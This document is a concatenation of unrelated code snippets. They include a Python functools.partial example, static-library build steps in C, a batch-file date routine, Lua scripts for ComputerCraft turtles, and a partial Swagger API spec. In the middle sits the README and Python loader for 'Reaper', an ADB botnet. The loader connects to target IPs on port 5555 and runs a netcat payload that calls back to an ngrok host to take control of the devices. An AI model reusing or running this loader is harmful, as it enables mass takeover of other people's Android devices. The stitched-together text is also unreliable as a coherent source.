title: Python partial example
content:
# 17.01.2024

'''
partial allows you to create functions
with some preset arguments
'''

from functools import partial

def multiply(x, y):
    return x * y

multiply_by_2 = partial(multiply, 2)

result = multiply_by_2(5)
print(result)  # Output: 10

# Create library folder
mkdir lib
cd lib

# Create library source file
gedit myLib.c

#include <stdio.h>

void printFun(void)
{
	printf("FUN from my static library.\n");
}

# Create library header file
gedit myLib.h

#ifndef MYLIB_H_INCLUDED
#define MYLIB_H_INCLUDED

void printFun(void);

#endif

# Compile the library and generate the object file. Add "lib" prefix to the object file by convention.
gcc -c myLib.c -o libMyLib.o

# Archive the library to .a file
ar rcs libMyLib.a libMyLib.o

# Test the library with ar
ar -t libMyLib.a

# Create another directory for main program
cd ..
mkdir program
cd program

# Create program source file
gedit main.c

#include <stdio.h>
#include <myLib.h>

int main(int argc, char **argv)
{
	printFun();
	return 0;
}

# Compile program's main.c, create main's object file .o with included library's directory
gcc -I ../lib -c main.c -o main.o

# Create executable program - main, linked with the static library from another directory (.a)
gcc -o main main.o ../lib/libMyLib.a

# run main program
./main

# That's all :)

if %testwell% gtr 3 echo . & echo now testing over 4 digit years. And l2 == %l2% & echo . & pause & echo .

:::::::::::::::::::[ Begin The Century Group ]:::::::::::::::::::

:century <string year4, int adjWeThink>

if %testwell% gtr 3 echo inside century, missing where? & echo .

if %testwell% gtr 3 echo missing where? & pause & echo .

if %testwell% gtr 3 echo missing where? & pause & echo .
if %testwell% gtr 3 if %yr4% gtr 9999 echo calling y10k next & echo . & pause & echo .

rem should alter   ^ millenium and century accordingly, same namespace.

if %testwell% gtr 3 echo -=8 ahead.
 REM & pause

if %testwell% gtr 3 echo lss 8 if geq 4 -=4 ahead.
 REM & pause
  if %century% lss 8 if %century% gtr 3 set /a century=(%century%-4)
if %testwell% gtr 3 echo . & echo century == %century% & echo .
  if %evenm% gtr 0 goto odd1
  
::: evenm
    if %century% equ 3 set /a adj=0
    if %century% equ 2 set /a adj=2
    if %century% equ 1 set /a adj=4
    if %century% equ 0 set /a adj=-1
    goto done1

:odd1   
    if %century% equ 3 set /a adj=4
    if %century% equ 2 set /a adj=-1
    if %century% equ 1 set /a adj=0
    if %century% equ 0 set /a adj=2

:done1
  if %yr4% lss 1753 set /a adjust=9 & echo . & echo Results for years before 1753 weren't gregorian.
  if %yr4% leq 6000 if %yr4% gtr 2100 if %testwell% gtr 0 call :crosscheck
REM if %testwell% gtr 3  echo done1 and adj == %adj% & echo . & pause & echo .
  endlocal & set "%~2=%adj%"
  exit /b %errorlevel%


::: NOTE: In this case, yr4 is not the lookup it is already just the YEAR.
::: Handles years up to 2,147,483,647 A.D.
:y10k
if %testwell% gtr 3 echo inside y10k now. & pause
  if %yr4% gtr 2147483000 echo Uh Oh!

::: NEAR FATAL Error x2! Begin Again fixes it fine! :::
  if %yr4% gtr 2147483646 echo overload & if exist %util3% call %util3% t :overload 0

::: 
  if exist %util3% call %util3% lenstr :strlen %yr4%
REM if %testwell% gtr 3 echo .& echo y10k: The length of %yr4% is %lenstr%. & echo .
 REM & pause & echo .
  set /a m2=(%lenstr%-3)
if %testwell% gtr 3 echo y10k pause, lenstr == %lenstr%, and m2 == %m2% & echo . & pause
  REM setlocal EnableExtensions
  REM setlocal EnableDelayedExpansion
  set /a millenium=(!yr4:~0,%m2%!)
  set /a century=(!yr4:~%m2%,1!)
  REM setlocal DisableDelayedExpansion
  REM setlocal DisableExtensions
if %testwell% gtr 3 echo . & echo Y0k: millenium == %millenium%, century == %century% & echo . & pause & echo .
  exit /b %errorlevel%


:crosscheck
  set crosschecker="%bats%\crosschecker.bat"
  if exist %crosschecker% call %crosschecker%
  echo . & echo That checks out. & echo .
  exit /b %errorlevel%

:::::::::::::::::::[ End of The Century Group ]:::::::::::::::::::


::: If mod equ 0 then it's a Leapyear, evenly divisible by 4.
:monthkey <int keyReturned, int monthNum>
  setlocal & set /a num=%~2
  if %num% equ 1 set /a key=1
  if %num% equ 10 set /a key=1
  if %num% equ 2 set /a key=4
  if %num% equ 3 set /a key=4
  if %num% equ 11 set /a key=4
  set /a mod=%date:~0,4% %% 4% 
  if %mod% neq 0 if %num% equ 4 set /a key=0
  if %mod% neq 0 if %num% equ 7 set /a key=0
  if %num% equ 5 set /a key=2
  if %num% equ 6 set /a key=5
  if %num% equ 7 set /a key=0
  if %num% equ 8 set /a key=3
  if %num% equ 9 set /a key=6
  if %num% equ 12 set /a key=6
  ::: Code it in as a hundred if it's leapyear! :::
  if %mod% equ 0 if %num% neq 4 if %num% neq 7 set /a key+=100
  endlocal & set "%~1=%key%"
  exit /b %errorlevel%


::: Get day of week word from day number.
:getdow <int weekdayNum, string weekday2Return>
  setlocal & set /a "dow=%~1"
  if %dow% equ 0 set /a dow=7
  if %dow% equ 1 set weekday=Sunday
  if %dow% equ 2 set weekday=Monday
  if %dow% equ 3 set weekday=Tuesday
  if %dow% equ 4 set weekday=Wednesday
  if %dow% equ 5 set weekday=Thursday
  if %dow% equ 6 set weekday=Friday
  if %dow% equ 7 set weekday=Saturday
  endlocal & set "%~2=%weekday%"
  exit /b %errorlevel%


:fetch <int yearLast2, int monthNum, int dayOfMonth>
  setlocal
  set /a yearLast2=(%date:~2,2%)
  set "monthNum=%date:~5,2%"
  if "%monthNum:~0,1%" equ " " set /a monthNum=(%monthNum:~1,1%)
  if "%monthNum:~0,1%" equ "0" set /a monthNum=(%monthNum:~1,1%)
  set "dayOfMonth=%date:~8,2%"
  if "%dayOfMonth:~0,1%" equ " " set /a dayOfMonth=(%dayOfMonth:~1,1%)
  if "%dayOfMonth:~0,1%" equ "0" set /a dayOfMonth=(%dayOfMonth:~1,1%)
  endlocal & set "%~1=%yearLast2%" & set "%~2=%monthNum%" & set "%~3=%dayOfMonth%"
  exit /b %errorlevel%


:errr
  setlocal
  echo . & echo Developmental CheckPoint!
  echo Enviromental Pollution. & echo .
  echo Something peculiar is amiss?
  echo . & pause & echo .
  endlocal
  exit /b %errorlevel%



  ::: 100% -JpE-

-- Movement API v0.0
-- An easy way to move turtles and keep a log of their new position and bearing
-- If unable to get location with GPS then default position is 0,0,0
-- GPS required to automatically get bearing - if no GPS and no bearing given program will not run.

local start = {["x"]=0,["y"]=0,["z"]=0,["bearing"]=0}
local position = {}
position.x = start.x
position.y = start.y
position.z = start.z
position.bearing = start.bearing

local movePos = {
    ["north"] = { 0, 0,-1},
    ["east"]  = { 1, 0, 0},
    ["south"] = { 0, 0, 1},
    ["west"]  = {-1, 0, 0},
	["up"]	  = { 0, 1, 0},
	["down"]  = { 0,-1, 0},
}

local facing = {
    [1] = "north",
    [2] = "east",
    [3] = "south",
    [4] = "west",
}

local updatePosition = function(going)
    if going == "forward" then
		local going = facing[position.bearing]
	elseif going == "back" then
        if (position.bearing + 2) < 5 then
			local going = facing[position.bearing + 2]
		else
			local going = facing[position.bearing - 2]
        end
	end
    if going == "right" then
		position.bearing = position.bearing + 1
		if position.bearing > 4 then position.bearing = 1 end
	elseif going == "left" then
        position.bearing = position.bearing - 1
		if position.bearing < 1 then position.bearing = 4 end
    else
		print(going)
		print(movePos[going])
		position.x = position.x + movePos[going][1]
		position.y = position.y + movePos[going][2]
    	position.z = position.z + movePos[going][3]
	end
end

local startup = function(bearing)
	start = {["x"]=0,["y"]=0,["z"]=0,["bearing"]=0}
	position.x = start.x
	position.y = start.y
	position.z = start.z
	position.bearing = start.bearing

	if bearing == "north" then
		start.bearing = 1
	elseif bearing == "east" then
		start.bearing = 2
	elseif bearing == "south" then
		start.bearing = 3
	elseif bearing == "west" then
		start.bearing = 4
	end

	if gps.locate() then
		start.x,start.y,start.z = gps.locate()
		local turns = 0
		while start.bearing == 0 do
			if turtle.forward() then
				local diffX,diffY,diffZ = gps.locate()
				if diffX and diffZ then
					diffX = diffX - start.x
					diffZ = diffZ - start.z
					if diffX > 0 then
						start.bearing = 2
					elseif diffX < 0 then
						start.bearing = 1
					elseif diffZ > 0 then
						start.bearing = 3
					elseif diffZ < 0 then
						start.bearing = 4
					end
				end
				if not turtle.back() then
					start.x,start.y,start.z = gps.locate()
				end
			else
				if turns < 4 then
					turtle.turnLeft()
					turns = turns + 1
				else 
					start.bearing = nil
				end
			end
		end
		
		if not start.bearing then
			start.bearing = 0
		end
		for i = 1,turns do
			turtle.turnRight()
			updatePosition("right")
		end
	end
	position.x = start.x
	position.y = start.y
	position.z = start.z
	position.bearing = start.bearing
end

local go = {}

go.forward = function(times)
    for i = 1,times do
		if turtle.forward() then
			updatePosition("forward")
		end
	end
end

go.back = function(times)
    for i = 1,times do
		if turtle.back() then
			updatePosition("back")
		end
	end
end

go.up = function(times)
    for i = 1,times do
		if turtle.up() then
			updatePosition("up")
		end
	end
end

go.down = function(times)
    for i = 1,times do
		if turtle.down() then
			updatePosition("down")
		end
	end
end

go.left = function(times)
    for i = 1,times do
		if turtle.turnLeft() then
			updatePosition("left")
		end
	end
end

go.right = function(times)
    for i = 1,times do
		if turtle.turnRight() then
			updatePosition("right")
		end
	end
end

local move = function(direction, times)
	if position.bearing == 0 then
		startup()
	end
	if turtle and facing[position.bearing] then
	local times = tonumber(times)
	if not times then times = 1 end
	if direction == "forward" or direction == "f" or direction == "fwd" then
		go.forward(times)
	elseif direction == "back" or direction == "b" then
		go.back(times)
	elseif direction == "up" or direction == "u" then
		go.up(times)
	elseif direction == "down" or direction == "d" then
		go.down(times)
	elseif direction == "left" or direction == "l" then
		go.left(times)
	elseif direction == "right" or direction == "r" then
		go.right(times)
	else
		return "Direction invalid"
	end
	
	end
end

local getPos = function()
	return {position.x,position.y,position.z,facing[position.bearing]}
end

local getStart = function()
	return {start.x,start.y,start.z,facing[start.bearing]}
end

return {
move = move,
initiate = startup,
position = getPos,
start = getStart,
}

content:
-- initial values

local blocksPlaced  = 0

local stoneName			= "minecraft:stone"
local woodName			= "TwilightForest:tile.TFLog"
local livingrockName	= "Botania:livingrock"
local livingwoodName	= "Botania:livingwood"

local slotFuel      = 0

local slotDead      = 1
local slotLiving    = 9

-- fuel

function fuel()
	if turtle.getFuelLevel() > 0 then
		print("already fueled")

	else
		local valid = turtle.refuel(0)

		if not valid then
			print("no valid fuel found")
			error()
		else
			print("fuel found")
			turtle.select( slotFuel )
			turtle.refuel()
		end
	end
end

-- movement

function moveOne()
	turtle.turnRight()
	turtle.forward()
	turtle.turnLeft()
end

function roundCorner()
	turtle.forward()
	turtle.forward()
	turtle.turnLeft()
end

-- slot selection

function nextDead()
	while turtle.getItemCount( slotDead ) == 0 do
		slotDead = slotDead + 1
		if slotDead > 8 then
			print("out of dead blocks; stopping")
			error()
		end
	end
	turtle.select( slotDead )
end

function nextLiving()
	while turtle.getItemCount( slotLiving ) == 64 do
		slotLiving = slotLiving + 1
		if slotLiving > 16 then
			print("at living block capacity; stopping")
			error()
		end
	end
	turtle.select( slotLiving )
end

-- program

fuel()

nextDead()

while turtle.getFuelLevel() > 0 do
	local has_block, block = turtle.inspect()

	if blocksPlaced < 2 then
		if not has_block then
			print("no block detected")

			print("placing dead block")
			nextDead()
			turtle.place()

			blocksPlaced = blocksPlaced + 1
			moveOne()

		elseif block.name == stoneName or block.name == woodName then
			print("dead block detected; waiting")
			sleep(2)

		elseif block.name == livingrockName or block.name == livingwoodName then
			print("living block detected")

			print("digging living block")
			nextLiving()
			turtle.dig()

		else
			print("invalid block")
			print("name: ", block.name)
			error()

		end
	else
		print("rounding corner")
		roundCorner()
		blocksPlaced = 0
	end
end

print("out of fuel; stopping")

content:
Reaper - An ADB-based botnet written in C.
Reaper is an ADB-based botnet that lets you control the devices you infect, and execute commands, and contains extra tools for playing around. It isn't just limited to ADB, it can be used as a telnet botnet or a regular botnet.

Version: 1.0.0

Why?
Here are a few reasons why I made this:

- I wanted to learn more about botnets.
- I wanted to make something that will help other people understand and learn more about botnets.
- I wanted to make my own from scratch because most botnets that are available on Github are all variants of Mirai or qbot.
Extra Facts:

- Yes, I know, I could've used epoll, but I didn't want to make things super-complicated and annoying.
- No, this does not contain any DDoS methods, If you want to customize this and add your own, then you are free to do so.
Installation
gcc -o reaper reaper.c -lpthread -lcurl
gcc -o client client.c
Usage
After you have authenticated with the botnet and are waiting for connections, run this command -> python3 loader.py droid.txt. Make sure you have edited your payload in the loader script. (It can be something as simple as nc <serverip> 1337) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IPs, on average, it pulls around 25 - 50 devices. Please remember, you don't have to limit yourself to only Android devices, if you want to use a telnet list, it will also work.

import sys
import subprocess

payload = "nc 0.tcp.ngrok.io 1470" # Edit this!


# Loader
# Date: 08/21/21
# Author: 0x1CA3


banner = """ 
                .____                     .___            
                |    |    _________     __| _/___________ 
                |    |   /  _ \__  \   / __ |/ __ \_  __ \\
                |    |__(  <_> ) __ \_/ /_/ \  ___/|  | \/
                |_______ \____(____  /\____ |\___  >__|   
                        \/         \/      \/    \/       
                 [Made by https://github.com/0x1CA3]
"""

def scan(line):
    subprocess.call("adb start-server", shell=True)
    subprocess.call(f"adb connect {line}:5555", shell=True)
        
    output = subprocess.Popen(["adb", "devices"], stdout=subprocess.PIPE).communicate()[0]
    if 'offline' not in str(output):
        print(f"Online! -> {line}")
    subprocess.call("adb kill-server", shell=True)
    subprocess.call(f"adb shell {payload}", shell=True)
    
    save_data = open("results.txt", "a")
    save_data.write(f"{line}")

def get_data(targets):
    devices_list = open(targets, "r")
    devices_data = devices_list.readlines()
    for line in devices_data:
        scan(line)

def main():
    print(banner)
    if len(sys.argv) < 2:
        print("Usage: python3 loader.py [FILE]")
        sys.exit()
    targets = sys.argv[1]
    get_data(targets)
main()

content:
swagger: "2.0"
info:
  title: installments/v2/service.proto
  version: version not set
tags:
  - name: Installments
consumes:
  - application/json
produces:
  - application/json
paths:
  /api/v1/installments/creds:
    patch:
      summary: Change installment's creds
      operationId: Installments_UpdateCreds
      responses:
        "200":
          description: A successful response.
          schema:
            type: object
            properties: {}
        default:
          description: An unexpected error response.
          schema:
            $ref: '#/definitions/rpcStatus'
      parameters:
        - name: body
          in: body
          required: true
          schema:
            $ref: '#/definitions/installmentsUpdateCredsRequest'
      tags:
        - Installments
  /api/v1/installments/limit/{userId}:
    get:
      summary: Get current user installment's limit (hrps)
      operationId: Installments_GetUserLimit
      responses:
        "200":
          description: A successful response.
          schema:
            $ref: '#/definitions/installmentsGetUserLimitResponse'
        default:
          description: An unexpected error response.
          schema:
            $ref: '#/definitions/rpcStatus'
      parameters:
        - name: userId
          in: path
          required: true
          type: string
      tags:
        - Installments
  /api/v1/installments/schedule:
    post:
      summary: Register new installment schedule
      operationId: Installments_RegisterSchedule
      responses:
        "200":
          description: A successful response.
          schema:
            $ref: '#/definitions/installmentsRegisterScheduleResponse'
        default:
          description: An unexpected error response.
          schema:
            $ref: '#/definitions/rpcStatus'
      parameters:
        - name: body
          in: body
          required: true
          schema:
            $ref: '#/definitions/installmentsRegisterScheduleRequest'
      tags:
        - Installments
  /api/v1/installments/schedule/calculate:
    post:
      summary: Calculate installment schedule for current order (hprs)
      operationId: Installments_CalculateSchedule
      responses:
        "200":
          description: A successful response.
          schema:
            $ref: '#/definitions/installmentsCalculateScheduleResponse'
        default:
          description: An unexpected error response.
          schema:
            $ref: '#/definitions/rpcStatus'
      parameters:
        - name: body
          in: body
          required: true
          schema:
            $ref: '#/definitions/installmentsCalculateScheduleRequest'
      tags:
        - Installments
  /api/v1/installments/schedule/id/{scheduleId}:
    get:
      summary: Get info about existed installment schedule
      operationId: Installments_GetSchedule
      responses:
        "200":
          description: A successful response.
          schema:
            $ref: '#/definitions/installmentsGetScheduleResponse'
        default:
          description: An unexpected error response.
          schema:
            $ref: '#/definitions/rpcStatus'
      parameters:
        - name: scheduleId
          in: path
          required: true
          type: string
        - name: userId
          in: query
          required: false
          type: string
